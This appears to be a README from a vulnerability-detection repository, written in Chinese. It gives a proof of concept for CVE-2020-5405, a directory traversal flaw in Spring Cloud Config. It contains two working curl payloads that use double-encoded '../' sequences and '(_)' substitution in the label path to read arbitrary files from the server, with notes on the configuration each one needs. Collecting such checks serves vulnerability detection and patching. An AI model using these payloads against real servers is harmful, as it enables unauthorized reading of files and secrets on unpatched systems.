[https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md](https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md)

poc：

```


1.  `利用点1：`
2.  `curl http://127.0.0.1:9988/foo/profiles/%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp/aaa.xxx`

4.  `读取/User/xuanyonghao/tmp/aaa.xxx文件`
5.  `foo 对应 {application}`
6.  `profiles 对应 {profiles}`
7.  `%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp 对应 {label}`

9.  `todo 条件限制：`
10.  `todo 1. 文件必须有后缀，也就是.txt等等。`
11.  `todo 2. cloud: config: server: native: search-locations: file:///tmp/{label}，此处的目录需要有{application}或{profiles}或{label}，因为在上述触发点会对url对应段进行替换进来location，导致目录穿越，但是会限制文件后缀`

13.  `利用点2：`
14.  `org.springframework.cloud.config.server.resource.ResourceController#resolveLabel(java.lang.String)`
15.  `利用此处把label处的(_)替换为/`
16.  `curl http://127.0.0.1:9988/foo/profiles/..%28_%29Users%28_%29xuanyonghao%28_%29tmp/aaa.xxx`

18.  `todo 条件限制：`
19.  `todo 1. 文件必须有后缀，也就是.txt等等。`
20.  `todo 2. 不像利用点1处，不需要配置{application}{profiles}{label}`


```